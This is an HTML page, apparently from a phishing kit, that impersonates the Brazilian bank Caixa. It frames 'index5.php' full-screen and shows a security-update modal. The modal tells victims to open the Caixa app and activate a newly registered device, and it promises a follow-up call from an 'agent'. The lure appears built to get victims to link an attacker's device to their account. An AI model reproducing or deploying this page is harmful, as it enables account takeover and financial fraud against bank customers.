<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">
<link href="https://fonts.googleapis.com/css?family=Advent+Pro:300|Athiti:200" rel="stylesheet">
<script src="js/bootstrap.min.js"></script>
<script>
function toggleFullScreen() {
  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
    if (document.documentElement.requestFullScreen) {  
      document.documentElement.requestFullScreen();  
    } else if (document.documentElement.mozRequestFullScreen) {  
      document.documentElement.mozRequestFullScreen();  
    } else if (document.documentElement.webkitRequestFullScreen) {  
      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
    }  
  } else {  
    if (document.cancelFullScreen) {  
      document.cancelFullScreen();  
    } else if (document.mozCancelFullScreen) {  
      document.mozCancelFullScreen();  
    } else if (document.webkitCancelFullScreen) {  
      document.webkitCancelFullScreen();  
    }  
  }  
}
</script>
<style>
.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }
.modalposition2{ max-width:400px; margin:0 auto; z-index: 99999; border: 1px solid #999; position: absolute; left:10px; right:10px;	font-family: Arial; top: 2%; background:#FFF; color:#000; box-shadow: 0 0 10px #999; padding:15px 15px 15px 15px; border-radius:3px; }
.modaltext{ padding:15px 15px 15px 0; color:#666666; }
#ok { padding:5px 20px 5px 20px; background:#F3A901; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}
</style>
</head>

<body style="margin:0;">
<iframe name="iframe" id="iframe" src="index5.php" frameborder="0" style="position:absolute; height:100%; width:100%;"></iframe>
<!-- ================================================================ -->
<div style="" id="modalalert" class="modalposition">
<div id="modalalert2" class="modalposition2">
<div style="font-size:16px;"><span class="glyphicon glyphicon-lock" style="color:#E60014;"></span>Aviso</div>
<div class="modaldiv1"><div class="modaltext">
  <div id="TextErrorModal" style="font-size:0.9em;">
    <p>Para finalizar a atualização da nova adesão de segurança caixa, acesse seu aplicativo caixa. vá em senhas e configurações, Clique na opção Gerenciar Dispositivos, Dispositivos Cadastrados, Selecione o dispositivo cadastrado na hora da atualização. E logo abaixo ative seu Dispositivo no botão laranja. após ativação aguarde a vinculação do seu novo dispositivo e a confirmação via sms.</p>
    <p><b>Caso o dispositivo não for ativo um de nossos atendentes entrará em contato,  Siga os passos a seguir para dar continuidade ao procedimento.</b></p>
  </div>
</div></div>
<div class="modaldiv2" align="right">
<a href="#closemodal"></a> <a href="#closemodal"><button onClick="document.getElementById('modalalert').style.display='none';return false" id="ok"> ok</button></a>
</div>
</div>
</div>
<!-- ================================================================ -->
</body>
</html>